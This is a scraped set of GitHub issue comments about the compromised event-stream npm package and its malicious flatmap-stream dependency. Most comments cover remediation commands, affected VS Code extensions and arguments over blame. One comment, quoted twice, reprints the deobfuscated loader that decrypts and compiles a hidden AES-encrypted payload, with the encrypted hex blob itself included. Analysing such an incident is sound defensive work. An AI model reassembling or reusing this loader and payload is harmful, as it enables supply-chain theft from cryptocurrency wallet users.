ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1"",""63727970746f"",""656e76"",""6e706d5f7061636b6167655f6465736372697074696f6e"",""616573323536"",""6372656174654465636970686572"",""5f636f6d70696c65"",""686578"",""75746638""]
>     // o = t[e(n[3])][e(n[4])];
>     // npm_package_description = process[decode(n[3])][decode(n[4])];
>     // npm_package_description = process['env']['npm_package_description'];
>     npm_package_description = 'Get all children of a pid'; // Description from ps-tree (this is the aes decryption key)
> 
> // if (!o) return;
> if (!npm_package_description) return;
> 
> // var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
> // var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description),
> var decipher = require('crypto')['createDecipher']('aes256', npm_package_description),
> 
>     // a = u.update(n[0], e(n[8]), e(n[9]));
>     // decoded = decipher.update(n[0], e(n[8]), e(n[9]));
>     decoded = decipher.update(n[0], 'hex', 'utf8');
> 
> console.log(n); // IDK why this is here...
> 
> // a += u.final(e(n[9]));
> decoded += decipher.final('utf8');
> 
> // var f = new module.constructor;
> var newModule = new module.constructor;
> 
> /**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/
> // f.paths = module.paths, f[e(n[7])](a, """"), f.exports(n[1])
> // newModule.paths = module.paths, newModule['_compile'](decoded, """"), newModule.exports(n[1])
> // newModule.paths = module.paths
> // newModule['_compile'](decoded, """") // Module.prototype._compile = function(content, filename)
> // newModule.exports(n[1])
> ```

How do we test if we're vulnerable? Please advise. We have an application in production that uses the asynchronous Node JS server and we are processing a lot of confidential data.

Best regards,
Jonathan"
1845	@jsloverperson why are you confused? Dates appear to be referenced above on this page https://github.com/dominictarr/event-stream/issues/116#issuecomment-441726229 . October 5th 2018 seems to be the critical date if I read this correctly.
1846	"@botanicdivision If your project is not Copay or a derivative thereof, then even if it contains the malicious library, it will not pose any risk. It's specifically designed only to execute in the context of Copay's build process.

I've found `yarn list` and `npm ls` to be somewhat unreliable, so your best bet is to search in your `yarn.lock` or `package-lock.json` for an entry of `flatmap-stream` -- specifically version `0.1.1`. Remediation steps are listed at the top of the first post."
1847	"> **EDIT 26/11/2018**:
> 
>     * **Am I affected?**:
>       If you are using anything crypto-currency related, then maybe. As discovered by @maths22, the target seems to have been identified as copay related libraries. It only executes successfully when a matching package is in use (assumed to be copay at this point). If you are using a crypto-currency related library and if you see `flatmap-stream@0.1.1` after running `npm ls event-stream flatmap-stream`, you are most likely affected. For example:
>       ```
>       $ npm ls event-stream flatmap-stream
>       ...
>       flatmap-stream@0.1.1
>       ...
>       ```
> 
>     * **What does it do**:
>       Other users have done some good analysis of what these payloads actually do.
>       
>       * [#116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441759047)
>       * [#116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441746370)
>       * [#116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441749105)
> 
>     * **What can I do**:
>       By this time fixes are being deployed and npm has yanked the malicious version. Ensure that the developer(s) of the package you are using are aware of this post. If you are a developer update your event-stream dependency to `event-stream@3.3.4`. **This protects people with cached versions of event-stream**.
> 
> 
> @dominictarr Why was @right9ctrl given access to this repo? He added [flatmap-stream](https://github.com/hugeglass/flatmap-stream) which is entirely (1 commit to the repo but has 3 versions, the latest one removes the injection, unmaintained, created 3 months ago) an injection targeting [ps-tree](https://github.com/indexzero/ps-tree). After he adds it at almost the exact same time the injection is added to `flatmap-stream`, he bumps the version and publishes. Literally the second commit (3 days later) after that he removes the injection and bumps a major version so he can clear the repo of having `flatmap-stream` but still have everyone (millions of weekly installs) using 3.x affected.
> 
> @right9ctrl If you removed flatmap-stream because your realized it was an injection attack why didn't you yank `event-stream@3.3.6` from npm and put a PSA? If you didn't know, why did you choose to use a completely unused/unknown library (0 downloads on npm until you use it)? If I had the exact date from npm in which `flatmap-stream@0.1.1` was published I wouldn't be asking you questions.
> 
> I've included a break down of what I have so far on `flatmap-stream` below. It includes the portion of code not found in the **unminified** source of `flatmap-stream@0.1.1` but found in the **minified** source. The code has been cleaned up a little to get a better understanding.
> 
> The worst part is I still don't even know what this does... The decrypted data n[0] is byte code or something, not regular javascript, or maybe I'm just not handling it correctly.
> 
> ```js
> // var r = require, t = process;
> 
> // function e(r) {
> //     return Buffer.from(r, ""hex"").toString()
> // }
> function decode(data) {
>     return Buffer.from(data, ""hex"").toString()
> }
> 
> // var n = r(e(""2e2f746573742f64617461"")),
> // var n = require(decode(""2e2f746573742f64617461""))
> // var n = require('./test/data')
> var n = [""75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629"",""db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1"",""63727970746f"",""656e76"",""6e706d5f7061636b6167655f6465736372697074696f6e"",""616573323536"",""6372656174654465636970686572"",""5f636f6d70696c65"",""686578"",""75746638""]
>     // o = t[e(n[3])][e(n[4])];
>     // npm_package_description = process[decode(n[3])][decode(n[4])];
>     // npm_package_description = process['env']['npm_package_description'];
>     npm_package_description = 'Get all children of a pid'; // Description from ps-tree (this is the aes decryption key)
> 
> // if (!o) return;
> if (!npm_package_description) return;
> 
> // var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
> // var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description),
> var decipher = require('crypto')['createDecipher']('aes256', npm_package_description),
> 
>     // a = u.update(n[0], e(n[8]), e(n[9]));
>     // decoded = decipher.update(n[0], e(n[8]), e(n[9]));
>     decoded = decipher.update(n[0], 'hex', 'utf8');
> 
> console.log(n); // IDK why this is here...
> 
> // a += u.final(e(n[9]));
> decoded += decipher.final('utf8');
> 
> // var f = new module.constructor;
> var newModule = new module.constructor;
> 
> /**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/
> // f.paths = module.paths, f[e(n[7])](a, """"), f.exports(n[1])
> // newModule.paths = module.paths, newModule['_compile'](decoded, """"), newModule.exports(n[1])
> // newModule.paths = module.paths
> // newModule['_compile'](decoded, """") // Module.prototype._compile = function(content, filename)
> // newModule.exports(n[1])
> ```

How do we test if we're vulnerable? Please advise. We have an application in production that uses the asynchronous Node JS server and we are processing a lot of confidential data.

Best regards,
Jonathan"
1848	"Is anyone else getting ""You can't comment at this time. ""??"
1849	Yes, GitHub is buggy. But your comments are getting through anyway.
1850	using services like snyk are ideal in this scenario? have they pushed a patch? https://snyk.io/
1851	@export-mike Snyk does not add anything in this case. They only added the incident to their database after it had already been resolved on npm's end by removing the malicious library.
1852	@botanicdivision run `npm ls event-stream flatmap-stream` in your project to see if you have any dependencies using this.
1853	We have an app, whose deploys are failing on Netlify. This is because `gulp-inject` uses `event-stream`. And now all our deploys are breaking. Are there any fixes to this? 
1854	@samrith-s They fixed it with this commit: https://github.com/klei/gulp-inject/commit/59bf9c68e4fe8cd500d196669df3bbd6e29611a9
1855	"Though this is unfortunate and could have been much more damaging had the malicious targeted less specific use cases (e.g. non-crypto related), this situation was handled relatively well and quickly.

Perhaps this goes to show that relying on more dependencies than we actually need should be weighted in more while deciding whether or not the wheel is worth reinventing, especially if all we need is _one small function_ present in a library.

That being said, great job to those who participated in the effort!"
1856	@mekwall thanks a lot, even I just checked it out!
1857	If the vulnerability is introduced in 3.3.6, then 3.3.5 should be safe too? Why is everyone changing to 3.3.4 instead? 
1858	Can we please lock this issue?
1859	"> @botanicdivision run `npm ls event-stream flatmap-stream` in your project to see if you have any dependencies using this.

> @botanicdivision run `npm ls event-stream flatmap-stream` in your project to see if you have any dependencies using this.


Thank you! I just forwarded this to my frontend developer.
"
1860	"> > @botanicdivision run `npm ls event-stream flatmap-stream` in your project to see if you have any dependencies using this.
> 
> > @botanicdivision run `npm ls event-stream flatmap-stream` in your project to see if you have any dependencies using this.

Don't forget the lockfiles."
1861	"Some time ago, a popular `cross-env` npm package had an evil twin called `crossenv`. For the `event-stream` we have a [eventstream](https://www.npmjs.com/package/eventstream) that have only 10 weekly downloads.
But if the `eventstream` were a working replica/fork of the real `event-stream`, how many developers would use it because tried to install it and it ""worked as expected""?"
1862	What a mess. Thanks to everyone who has been looking into this issue and sounding the alarm.
1863	"I’m a beginning JavaScript developer, so I’m not experienced in writing malware, could you transfer this repo and package to me?
(don’t take it seriously, guys)"
1864	"> That guy should be in jail

I agreen't."
1865	"Visual Studio Code itself is safe but these extensions were affected:

- aoisupersix.bve5-language-support
- apollographql.vscode-apollo
- ardenivanov.svelte-intellisense
- ballerina.ballerina
- BattleBas.kivy-vscode
- cesium.gltf-vscode
- christianvoigt.argdown-vscode
- codemooseus.vscode-devtools-for-chrome
- curlybracket.vlocode
- ivory-lab.jenkinsfile-support
- JacobeanResearchandDevelopmentLLC.vscode-scxml-preview
- joe-re.sql-language-server
- jomiller.rtags-client
- jorithvdheuvel.webdav
- KazuoCode.gthubsum
- kddejong.vscode-cfn-lint
- Koihik.vscode-lua-format
- myxvisual.vscode-ts-uml
- OptimaSystems.vscode-apl-language-client
- Paul-Ehigie-Paul.nativescript-extend
- qoretechnologies.qorus-vscode
- quantum.quantum-devkit-vscode
- ritwickdey.LiveServer
- rkoubou.ksp
- roboceo.robojsx-plugin
- salbert.comment-ts
- SiteGo.spgo
- terminus.tangram-vscode-plugin
- tintrinh.php-refactor
- tomoki1207.pdf
- vlopes11.advpls-client
- webhint.vscode-webhint
- wix.stylable-intelligence
- Yseop.vscode-yseopml
- zfzackfrost.commentbars
- Zowe.vscode-extension-for-zowe

More information: https://code.visualstudio.com/blogs/2018/11/26/event-stream"
1866	"For those who want to know if they were affected as well. 

You can run `npm audit` on a project will surface it as a critical vulnerability as well. "
1867	"> You can run `npm audit` on a project will surface it as a critical vulnerability as well.

Or `yarn audit`"
1868	Edit: Ok nvm, this comment was dumb, just wanted to speak my mind.
1869	"> Did we consider the possibility that @dominictarr might have masterplanned everything by creating a new npm user and transfering the publish rights, then infecting the library and now playing his role?
> 
> Since you can't be this dumb to transfer it and still have association on the github?

Assumptions are not helpful at this point (anymore). It happened. Now we have to update many dependents.

I guess you've never maintained many and big projects."
1870	The sheer amount of entitlement in this thread is absolutely disgusting. A lot of people need to fix their attitude towards someone who provides this for free.
1871	So, what does this attack do?
1872	"> So, what does this attack do?

https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502"
1873	@FallingSnow I registered here because you broke our company continuous workflow. Please be so kind to restore the working version of the package on NPM and don't remove it anymore, idealistic solution is enemy of the working!
1874	"> @FallingSnow I registered here because you broke our company continuous workflow. Please be so kind to restore the working version of the package on NPM and don't remove it anymore, idealistic solution is enemy of the working!

npmjs removed it as it was only containing the payload, nothing more."
1875	"> @FallingSnow I registered here because you broke our company continuous workflow. Please be so kind to restore the working version of the package on NPM and don't remove it anymore, idealistic solution is enemy of the working!

Maybe you should read through the thread and consider why it was removed..."
1876	You're removal of the package broke our process, it says it can't find package on the server, it worked before with no problems...
1877	"> You're removal of the package broke our process, it says it can't find package on the server, it worked before with no problems...

It's been removed because it is a high risk security vulnerability in the package. You'll either need wait until the package has been fixed or migrate away from using this dependency. The latter is probably a better choice since the original author probably can't be trusted anyway."
1878	"> It's been removed because it is a high risk security vulnerability in the package. You'll either need wait until the package has been fixed or migrate away from using this dependency. The latter is probably a better choice since the original author probably can't be trusted anyway.

In general: we have no clear migration paths until now. Or do we?"
1879	"> You're removal of the package broke our process, it says it can't find package on the server, it worked before with no problems...

You're better off just copy-pasting the 350 lines of the module for now."
1880	Most reasonable is to unstar this project in Github and move away from this dep!   
1881	@joshua1135 breaking your companys workflow is not anyone elses concern. Edit the module yourself, welcome to using software provided to you by other people.
1882	"> You're removal of the package broke our process, it says it can't find package on the server, it worked before with no problems...

dear god I pray whatever company you work for realizes how dumb you are"
1883	"I'm honestly surprised that this issue hasn't been frozen yet.
The comments are mostly spam by now... @dominictarr wdyt?"
1884	">The latter is probably a better choice since the original author probably can't be trusted anyway.

By ""Original Author"" I hope you don't mean the repository owner. Because we really need to stop blaming the repo owner for this fiasco. Maybe he made a rash decision by giving perms to someone without verifying creds but I can understand the situation of a developer not willing to maintain a popular OS repo and the community barraging with issues."
1885	If I would have an open source repo which is used by millions of people and I will no longer want to maintain it, I will announce it properly and warn people either not to use it or give it to someone trusted to maintain it. There should not be any hard feeling towards the original author though. It's not easy to take out time from your busy schedule for open source work, unless you are doing it full time.
1886	"> the original author probably can't be trusted anyway.

wow. you're quick to judge someone who's likely the victim of social engineering. he was maintaining a package you relied on for _free_. maybe try and be a bit more fair here?"
1887	@tuananh Done! See haykam821/Streamed-Events@f01d151943280d4c1bbb1e0785321051dc67250f. 😄
1888	"
> > You're removal of the package broke our process, it says it can't find package on the server, it worked before with no problems...
> 
> dear god I pray whatever company you work for realizes how dumb you are

Please, this is a no laughing matter, I don't understand why you think you're so smart and you can't even give a simple solution tomy problem. The whole system is stopped because of this..."
1889	@joshua1135 We don't care about you being able to do your work. We only care about the security vulnerability that we're trying to quickly fix here.
1890	"> Please, this is a no laughing matter, I don't understand why you think you're so smart and you can't even give a simple solution tomy problem. The whole system is stopped because of this...

Which dependency exactly uses `flatmap-stream`?
You can check this with `npm ls flatmap-stream` and `yarn list --pattern flatmap-stream` and `yarn why flatmap-stream`."
1891	"> Please, this is a no laughing matter, I don't understand why you think you're so smart and you can't even give a simple solution tomy problem. The whole system is stopped because of this...

Because you're obviously incompetent and shouldn't be in charge of DevOps at your company.

You are asking for a package to be restored that contained malware. While this particular one doesn't target your company unless your business is building a particular bitcoin wallet, installing a package with a known backdoor is irresponsible nonetheless"
1892	"@joshua1135 
Read the thread on this page and all will be revealed. Herein you will find both an explanation of the problem and several simple solutions (some of which were addressed directly to you). No one here can help you any more than they already have."
1893	@joshua1135 The package was removed due to a security vulnerability. There are multiple work arounds here, and you're not using them. 
1894	When reality imitates art... https://xkcd.com/1172/
1895	"> Because you're obviously incompetent and shouldn't be in charge of DevOps at your company.

Blaming does not help anyone."
1896	@breautek Why the author can't be trusted? Is there danger to the data in any way?
1897	@joshua1135 you're asking questions that can easily be answered by reading this thread. 
1898	"> > > You're removal of the package broke our process, it says it can't find package on the server, it worked before with no problems...
> > 
> > 
> > dear god I pray whatever company you work for realizes how dumb you are
> 
> Please, this is a no laughing matter, I don't understand why you think you're so smart and you can't even give a simple solution tomy problem. The whole system is stopped because of this...

@joshua1135  You joined github today - you have no github history, You're unlikely to actually be anything. "
1899	@joshua1135 for the love of god, just start at the very top and read. Just read. Stop asking questions. Just read. 
1900	"@dominictarr ""With great power comes great responsibility.""  ~Uncle Ben"
1901	"> @breautek Why the author can't be trusted? Is there danger to the data in any way?

The original owner / maintainer has no more access to the repo and npm. But this is not helpful currently."
1902	"@dominictarr Amongst all the horrible things others are saying, I would like to thank you for creating and maintaining a widely used package for as long as you did. Thank you ❤️

Everyone else: This incident is obviously unfortunate but lets not forget that their time was free and any one of us could’ve done the same thing."
1903	"@DanielRuf Agreed, but I couldn't resist
![](https://emoji.fileformat.info/gemoji/trollface.png)"
1904	This guy @joshua1135 has 0 stars, 0 repo, 0 everything. He joined the github and hour ago.  Seems like he is the hacker :D
1905	"@joshua1135 is trolling guys. Chill
He literally joined github today"
1906	Am I correct in understanding there are known-non-malicious-actors who still have commit access to this repo? It might be worth locking this thread and only allowing updates from folks with a maintainer bit about updates...
1907	"From now:

```
npm owner ls event-stream

npm <npm@npmjs.com>
```

I don't know what they will do. Good luck to them to solve that! 🤘 "
1908	"> Am I correct in understanding there are known-non-malicious-actors who still have commit access to this repo?

No. Not that we are aware of. Just npm themself.
npm team is not a maintainer of this repo here on GitHub. They just took control of it on npmjs (just `flatmap-stream`, not `event-stream`)."
1909	"Please stop having a go at @dominictarr ... its up to us as developers to audit, understand and think about the implications of dependencies. This is a failure in the trust model of NPM / github and open source collaboration not the actions of a single developer. 
"
1910	"@m-onz It is absolutely his fault for causing this to happen. You say:

> its up to us as developers to audit, understand and think about the implications of dependencies

He did not ""audit, understand, and think about the implications"" of transferring a widely-used package to an untrustable person. He should share the blame for causing this security vulnerability. He let it happen by letting another person own the package, we let it keep happening by not checking what the new person was doing."
1911	"Joshua isn't a troll. His native language clearly isn't English and he's probably in charge of ""making things work"" in some small company. Now the build of his app is broke and he's desperately asking for help online -- which is annoying, I know, but I guess his boss is yelling at him as he types his messages in this thread so he has no time to consider the annoyance his messages may rise.

Unfortunately he's probably used to the ""just type npm install whatever"" answers the javascript community loves to provide, always lacking a proper explanation for the why.

Maybe you guys don't know but Joshua is how most of the javascript community looks like.
"
1912	"@haykam821  your still talking about the 'trust model'  which is not dominics fault.... its not his problem to solve. We should stop trolling his repo with an issue that arguably is NPMs to solve.

NPM fails to address the evil package owner problem! FACT"
1913	"npm ls flatmap-stream
/home/vagrant/projects/node-channels
└─┬ nodemon@1.18.6
  └─┬ pstree.remy@1.1.0
    └─┬ ps-tree@1.1.0
      └─┬ event-stream@3.3.6
        └── flatmap-stream@0.1.2

npm i --save nodemon@1.18.5
npm ls flatmap-stream
/home/vagrant/projects/node-channels
└── (empty)
 Just checko your dependency tree ant downgrade to working version"
1914	"@m-onz

> an issue that arguably is NPMs to solve

I agree that there is one problem with package auditing: NPM really needs to warn users when upgrading a package to a version that a different person owns."
1915	exactly .... so how is that dominics fault again?
1916	"The library code was changed from no read/write on desk to being able to modify other node packages and access env variables. 

My question is on the security of npm packages in generals, shouldn't we grant explicit permissions to dependencies that need networking and desk access? and alert when those permissions change?  what safeguards we've against abusive NPM packages? the other issue, shouldn't we be able to also restrict libraries from using globals? I mean this attack hijacked another function via JS prototypes, again what security do we've again another similar attack?"
1917	I think the most useful thing that we can do now is to share about this problem on social networks. It is necessary that as much as possible people knew about it
